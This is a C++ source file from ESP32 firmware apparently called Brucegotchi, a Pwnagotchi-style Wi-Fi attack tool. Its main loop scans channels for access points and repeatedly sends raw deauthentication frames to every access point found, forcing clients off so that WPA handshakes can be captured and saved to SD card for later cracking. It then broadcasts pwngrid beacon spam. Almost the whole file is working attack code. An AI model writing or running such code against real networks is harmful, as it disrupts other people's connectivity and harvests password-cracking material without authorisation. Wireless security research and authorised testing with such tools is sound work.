#if !defined(LITE_VERSION)
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>
#include <map>
#include <vector>
#include <algorithm>
#include <set>

// ============================================================================
// Pwnagotchi-style state machine for Brucegotchi
// ============================================================================
// Phases mirror the real Pwnagotchi algorithm:
//   RECON   → hop all channels to discover APs
//   INTERACT→ process channels by AP density (deauth, wait for handshake)
//   ADVERTISE→ pwngrid beacon spam + friend discovery
// ============================================================================

// ---------------------------------------------------------------------------
// Constants (tuned for ESP32-S3 — less powerful than RPi zero)
// ---------------------------------------------------------------------------
#define BRUCE_RECON_HOP_MS          350   // ms per channel during recon hop
#define BRUCE_RECON_DEAUTH_MS       300   // ms to send deauths on a channel
#define BRUCE_HOP_RECON_MS          3500  // ms to wait on channel after deauth
#define BRUCE_MIN_RECON_MS          1200  // ms to wait if no deauth on channel
#define BRUCE_MAX_AP_INTERACTIONS   4     // max deauth attempts per AP per cycle
#define BRUCE_ADVERTISE_INTERVAL_MS 3000   // ms between pwngrid beacons
#define BRUCE_ADVERTISE_PHASE_MS    12000  // total ms for advertise phase

// Phase enum
enum class BrucePhase : uint8_t {
    RECON,
    INTERACT,
    ADVERTISE
};

// ---------------------------------------------------------------------------
// Old globals kept for compatibility
// ---------------------------------------------------------------------------
uint8_t state;
uint8_t current_channel = 255;
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;
bool use_all_channels = false;

const uint8_t pri_wifi_channels_default[] = {1, 6, 11};
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

// ---------------------------------------------------------------------------
// Forward declarations
// ---------------------------------------------------------------------------
void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();
static uint64_t bruceMacToKey(const void *mac);


// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static uint64_t bruceMacToKey(const void *mac) {
    const uint8_t *u = (const uint8_t *)mac;
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) { key = (key << 8) | (uint64_t)u[i]; }
    return key;
}

// Count how many (non-stale) beacons are on a given channel
static int countBeaconsOnChannel(uint8_t channel) {
    int cnt = 0;
    for (const auto &b : registeredBeacons) {
        if (b.channel == channel) cnt++;
    }
    return cnt;
}

// ---------------------------------------------------------------------------
// toggle_all_channels — swap between 3-chan (1,6,11) and all 12
// ---------------------------------------------------------------------------
void toggle_all_channels() {
    use_all_channels = !use_all_channels;
    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
    }
    current_channel = 255;
}

// ---------------------------------------------------------------------------
// brucegotchi_setup — init pwngrid + UI
// ---------------------------------------------------------------------------
void brucegotchi_setup() {
    initPwngrid();
    initUi();
    state = 0; // STATE_INIT
}

// ---------------------------------------------------------------------------
// brucegotchi_update — kept for external callers, no-op in new state machine
// ---------------------------------------------------------------------------
void brucegotchi_update() {
    updateUi(true);
}

// ---------------------------------------------------------------------------
// wakeUp — startup animation across channels
// ---------------------------------------------------------------------------
void wakeUp() {
    for (uint8_t i = 0; i < active_channels_size; i++) {
        ch = active_channels[i];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        setMood(i % 23);
        updateUi(false);
        vTaskDelay(800 / portTICK_RATE_MS);
    }
}

// ---------------------------------------------------------------------------
// advertise — send pwngrid beacon, check for errors
// ---------------------------------------------------------------------------
void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, 23));
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(19, "", "Error: invalid interface", true);
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(19, "", "Error: invalid argument", true);
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(19, "", "Error: not enough memory", true);
    } else if (result != ESP_OK) {
        setMood(19, "", "Error: unknown", true);
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

// ---------------------------------------------------------------------------
// brucegotchi_start — main entry point
// ---------------------------------------------------------------------------
void brucegotchi_start() {
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0;
    sniffer_reset_handshake_cache();
    registeredBeacons.clear();
    vTaskDelay(300 / portTICK_RATE_MS);

    // Prepare storage
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
        if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
        if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    brucegotchi_setup();
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    sniffer_set_mode(SnifferMode::HandshakesOnly);

#if defined(HAS_TOUCH)
    TouchFooter();
#endif

    // --- State machine ---
    BrucePhase phase = BrucePhase::RECON;
    uint32_t phaseStart = millis();
    uint32_t lastAdvertise = 0;
    int prevHS = 0;

    uint8_t reconIdx = 0;
    uint8_t interactIdx = 0;
    bool didDeauth = false;

    // Sorted channel list (rebuilt after each recon)
    std::vector<uint8_t> sortedChannels;
    // Per-AP deauth attempt counter (key = macToKey)
    std::map<uint64_t, uint8_t> apDeauthCount;

    // First iteration: set initial channel immediately
    ch = active_channels[0];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    setMood(14, "(@__@)", "Scanning...");
    updateUi(true);
    phaseStart = millis();
    reconIdx = 0;

    while (true) {
        // --- Global exit checks ---
        if (check(EscPress) || pwnagotchi_exit) break;

        // --- Menu trigger ---
        if (check(SelPress)) {
            String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";
            options = {
                {"Find friends", yield},
                {"Pwngrid spam", send_pwnagotchi_beacon_main},
                {channel_status.c_str(), toggle_all_channels},
                {"Main Menu", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            loopOptions(options);
            tft.fillScreen(bruceConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
            phaseStart = millis();
            lastAdvertise = 0;
        }

        // --- Handshake celebration ---
        if (num_HS > prevHS) {
            prevHS = num_HS;
            setMood(0, "(0__0)", "Got handshake!");
            updateUi(true);
            vTaskDelay(800 / portTICK_PERIOD_MS);
            // Don't reset phaseStart here — just let the current phase continue
        }

        // ====================================================================
        // PHASE: RECON — quickly scan all channels to discover APs
        // ====================================================================
        if (phase == BrucePhase::RECON) {
            // How many channels to scan
            uint8_t nCh = active_channels_size;

            if (reconIdx < nCh) {
                unsigned long elapsed = millis() - phaseStart;
                if (elapsed >= BRUCE_RECON_HOP_MS) {
                    reconIdx++;
                    if (reconIdx < nCh) {
                        ch = active_channels[reconIdx];
                        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                        phaseStart = millis();
                    }
                }
            }

            // Recon complete — build sorted channel list
            if (reconIdx >= nCh) {
                // Count APs per channel
                std::map<uint8_t, int> chanCount;
                for (const auto &b : registeredBeacons) {
                    chanCount[b.channel]++;
                }

                // Sort channels by AP count descending
                sortedChannels.clear();
                std::vector<std::pair<uint8_t, int>> chList(chanCount.begin(), chanCount.end());
                std::sort(chList.begin(), chList.end(),
                    [](const std::pair<uint8_t, int> &a, const std::pair<uint8_t, int> &b) {
                        return a.second > b.second;
                    });
                for (auto &p : chList) {
                    sortedChannels.push_back(p.first);
                }

                // Append any channels with zero APs (in numeric order)
                for (uint8_t i = 0; i < nCh; i++) {
                    uint8_t c = active_channels[i];
                    if (chanCount.find(c) == chanCount.end()) {
                        sortedChannels.push_back(c);
                    }
                }

                // Reset per-cycle tracking
                apDeauthCount.clear();

                // Transition to INTERACT
                phase = BrucePhase::INTERACT;
                interactIdx = 0;
                phaseStart = millis();

                int totalAPs = registeredBeacons.size();
                char buf[48];
                snprintf(buf, sizeof(buf), "Found %d APs on %d channels", totalAPs, (int)sortedChannels.size());
                setMood(8, "(-@_@)", buf);
                updateUi(true);
                vTaskDelay(600 / portTICK_PERIOD_MS);
                phaseStart = millis();
            }
        }

        // ====================================================================
        // PHASE: INTERACT — per channel: deauth APs, wait for handshakes
        // ====================================================================
        if (phase == BrucePhase::INTERACT) {
            if (interactIdx < sortedChannels.size()) {
                uint8_t currentChan = sortedChannels[interactIdx];
                unsigned long elapsed = millis() - phaseStart;

                if (elapsed < 50) {
                    // Just switched — set channel
                    ch = currentChan;
                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                    vTaskDelay(30 / portTICK_PERIOD_MS);
                }

                if (elapsed >= 50 && elapsed < (uint32_t)(50 + BRUCE_RECON_DEAUTH_MS)) {
                    // DEAUTH sub-phase
                    ch = currentChan;

                    // How many APs are deauth-eligible on this channel
                    int apCount = countBeaconsOnChannel(currentChan);
                    int skipped = 0;

                    for (const auto &beacon : registeredBeacons) {
                        if (beacon.channel != currentChan) continue;
                        if (check(SelPress)) break;
                        if (pwnagotchi_exit) break;

                        uint64_t key = bruceMacToKey(beacon.MAC);

                        // [1] Skip APs that already have a valid handshake
                        if (sniffer_is_handshake_ready(key)) {
                            skipped++;
                            continue;
                        }

                        // [2] Skip APs that have been deauthed enough times
                        if (apDeauthCount[key] >= BRUCE_MAX_AP_INTERACTIONS) {
                            skipped++;
                            continue;
                        }

                        // Deauth this AP
                        memcpy(&ap_record.bssid, beacon.MAC, 6);
                        wsl_bypasser_send_raw_frame(&ap_record, currentChan, _default_target);
                        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                        apDeauthCount[key]++;
                        didDeauth = true;
                    }

                    if (didDeauth) {
                        char buf[48];
                        int attempted = apCount - skipped;
                        snprintf(buf, sizeof(buf), "Deauthing ch%d (%d/%d APs)", currentChan, attempted, apCount);
                        setMood(8, "(-@_@)", buf);
                        updateUi(true);
                    }
                }

                // WAIT sub-phase — listen for handshake
                uint32_t waitTarget = didDeauth ? BRUCE_HOP_RECON_MS : BRUCE_MIN_RECON_MS;
                if (elapsed >= (uint32_t)(50 + BRUCE_RECON_DEAUTH_MS + waitTarget)) {
                    interactIdx++;
                    didDeauth = false;
                    phaseStart = millis();

                    // Quick update
                    ssize_t remaining = (ssize_t)sortedChannels.size() - (ssize_t)interactIdx;
                    if (remaining > 0 && interactIdx < sortedChannels.size()) {
                        char buf[48];
                        snprintf(buf, sizeof(buf), "Next: ch%d (%d left)", sortedChannels[interactIdx], (int)remaining);
                        setMood(8, "(-@_@)", buf);
                        updateUi(true);
                    }
                }
            }

            // All channels processed — transition to ADVERTISE
            if (interactIdx >= sortedChannels.size()) {
                phase = BrucePhase::ADVERTISE;
                phaseStart = millis();
                lastAdvertise = 0;
                setMood(10, "(^__^)", "Making friends!");
                updateUi(true);
            }
        }

        // ====================================================================
        // PHASE: ADVERTISE — pwngrid beacon spam
        // ====================================================================
        if (phase == BrucePhase::ADVERTISE) {
            // Advertise every BRUCE_ADVERTISE_INTERVAL_MS
            if (lastAdvertise == 0 || millis() - lastAdvertise >= BRUCE_ADVERTISE_INTERVAL_MS) {
                advertise(ch);
                lastAdvertise = millis();
            }

            // After advertise phase, restart the cycle with a fresh recon
            if (millis() - phaseStart >= BRUCE_ADVERTISE_PHASE_MS) {
                phase = BrucePhase::RECON;
                reconIdx = 0;
                interactIdx = 0;
                didDeauth = false;
                sortedChannels.clear();
                apDeauthCount.clear();

                // First channel
                ch = active_channels[0];
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                setMood(14, "(@__@)", "Scanning...");
                updateUi(true);
                phaseStart = millis();
            }
        }

        // --- Periodic UI update ---
        static unsigned long lastUiUpdate = 0;
        if (millis() - lastUiUpdate > 2000) {
            updateUi(true);
            lastUiUpdate = millis();
        }

        vTaskDelay(20 / portTICK_RATE_MS);
    }

    // Cleanup — everything must be fully stopped
    sniffer_wait_for_flush(2000);           // drain any pending handshake writes
    esp_wifi_set_promiscuous(false);        // stop promiscuous capture
    esp_wifi_set_promiscuous_rx_cb(nullptr); // remove sniffer callback
    wifiDisconnect();                       // fully stop WiFi (AP + STA + mode OFF)
    registeredBeacons.clear();              // clear AP beacon list
    clearPwngridPeers();                    // clear pwngrid peer list
    sniffer_reset_handshake_cache();        // clear handshake tracking state
}
#endif
